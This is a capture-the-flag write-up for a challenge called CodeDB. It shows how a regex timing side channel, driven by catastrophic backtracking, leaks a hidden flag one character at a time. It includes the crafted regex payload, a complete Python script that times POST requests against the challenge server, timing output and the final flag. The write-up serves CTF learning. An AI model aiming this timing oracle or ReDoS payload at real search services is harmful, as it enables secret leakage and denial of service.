---
ai_date: 2025-04-27 05:28:37
ai_summary: Exploited timing difference in regex search to guess flag characters
ai_tags:
  - regex
  - timing-attack
  - search
created: 2025-01-11T17:14
points: 388
solves: 52
title: CodeDB
updated: 2025-07-14T09:46
---

We need to somehow access flag.txt which is not accessible via `/view/:fileName` nor via the worker.

A lot of effort was spent on trying to somehow prototype pollute the worker, but in the end, I used timing attack.

The regex payload.

```
/(^uoftctf\{w.*$)|(^u(.*?)*o(.*?)*f(.*?)*t(.*?)*c(.*?)*t(.*?)*f(.*?)*\{(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*~$)/
```

The idea is simple, the regex can exit early if the flag prefix + the character guessed is correct. Otherwise it would have to execute the super time consuming regex on the right side of the `|`.

- `(^uoftctf\\{w.*$)` simple match for the flag string.
- `(.*?)*` these will cause the regex to backtrack constantly, slowing everything down.

I will guess one character at a time, taking the one that takes least amount of time to respond.

```python
from statistics import mean
import time
import string
import random
import requests
from tqdm import tqdm

target = "http://34.162.172.123:3000/search"
# target = "http://localhost:3000/search"


def try_flag(flag):
    s = time.perf_counter()
    res = requests.post(target, json={"query": flag, "language": None})
    e = time.perf_counter() - s
    return e


def check(prefix):
    def escape_special_chars(s):
        return ['\\' + c if c in string.punctuation else c for c in s]
    center = ''.join(f"{c}(.*?)*" for c in escape_special_chars(prefix))
    flags = [
        (f"/(^{''.join(escape_special_chars(prefix+c))}.*$)|(^{center}(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*(.*?)*~$)/", prefix+c) for c in string.printable
    ]
    flags = [flag for flag in flags for _ in range(1)]
    random.shuffle(flags)
    results = []
    for flag, _flag in tqdm(flags, desc="Processing flags"):
        time = try_flag(flag)
        results.append((time, _flag))
    flag_times = {}
    for time_taken, flag in results:
        if flag not in flag_times:
            flag_times[flag] = []
        flag_times[flag].append(time_taken)

    results = [(flag, min(times), mean(times), max(times)) for flag, times in flag_times.items()]
    results.sort(key=lambda x: x[1])
    for f, mn, md, mx in results[:5]:
        print(f"{f}: {mn} {md} {mx}")
    diff = results[1][1] - results[0][1]
    print(f"time diff = {diff}")
    print(f"final = {results[0][0]}")
    return results[0][0]


if __name__ == "__main__":
    prefix = 'uoftctf{'
    while True:
        prefix = check(prefix)
        print(prefix)
```

I originally wanted to run each payload a few times but the regex was so slow that it wasn't needed.

As you can see, the difference in time is huge.

```
uoftctf{why_15: 0.141611400002148 0.141611400002148 0.141611400002148
uoftctf{why_1z: 1.058887399995001 1.058887399995001 1.058887399995001
uoftctf{why_1+: 1.05915049999021 1.05915049999021 1.05915049999021
uoftctf{why_1@: 1.0593788999831304 1.0593788999831304 1.0593788999831304
uoftctf{why_1b: 1.0597369000024628 1.0597369000024628 1.0597369000024628
time diff = 0.917275999992853
final = uoftctf{why_15
```

The difference only gets larger as the flag prefix increase in size.

```
uoftctf{why_15_my_4pp_l4661n6: 0.10187479999149218 0.10187479999149218 0.10187479999149218
uoftctf{why_15_my_4pp_l4661nQ: 1.057343899999978 1.057343899999978 1.057343899999978
uoftctf{why_15_my_4pp_l4661n!: 1.0575902000127826 1.0575902000127826 1.0575902000127826
uoftctf{why_15_my_4pp_l4661n\: 1.0577397999877576 1.0577397999877576 1.0577397999877576
uoftctf{why_15_my_4pp_l4661nb: 1.0579903999750968 1.0579903999750968 1.0579903999750968
time diff = 0.9554691000084858
```

```flag
uoftctf{why_15_my_4pp_l4661n6_50_b4dly??}
```

Hrm, maybe this was the intended solution?